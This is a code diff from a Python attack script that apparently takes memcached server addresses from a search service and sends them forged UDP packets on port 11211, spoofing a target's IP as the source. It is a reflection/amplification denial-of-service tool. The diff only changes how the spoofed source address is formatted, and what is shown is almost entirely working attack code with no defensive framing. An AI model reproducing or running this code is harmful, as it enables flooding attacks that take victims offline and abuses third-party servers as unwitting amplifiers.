@@ -42,11 +42,11 @@ while True:
                     if power>1:
                         print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
                         with suppress_stdout():
-                            send(IP(dst='%s' % result['ip_str'], src=target) / UDP(dport=11211)/Raw(load=data), count=power)
+                            send(IP(dst='%s' % result['ip_str'], src='%s' % target) / UDP(dport=11211)/Raw(load=data), count=power)
                     elif power==1:
                         print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
                         with suppress_stdout():
-                            send(IP(dst='%s' % result['ip_str'], src=target)/ UDP(dport=11211)/Raw(load=data), count=power)
+                            send(IP(dst='%s' % result['ip_str'], src='%s' % target)/ UDP(dport=11211)/Raw(load=data), count=power)
                 print('')
                 print('0.0')
                 print('')
@@ -59,11 +59,11 @@ while True:
                             if power>1:
                                 print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
                                 with suppress_stdout():
-                                    send(IP(dst='%s' % result['ip_str'], src=target) / UDP(dport=11211)/Raw(load=data), count=power)
+                                    send(IP(dst='%s' % result['ip_str'], src='%s' % target) / UDP(dport=11211)/Raw(load=data), count=power)
                             elif power==1:
                                 print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
                                 with suppress_stdout():
-                                   send(IP(dst='%s' % result['ip_str'], src=target) / UDP(dport=11211)/Raw(load=data), count=power)
+                                   send(IP(dst='%s' % result['ip_str'], src='%s' % target) / UDP(dport=11211)/Raw(load=data), count=power)
                         print('')
                         print('0.0')
                         print('')
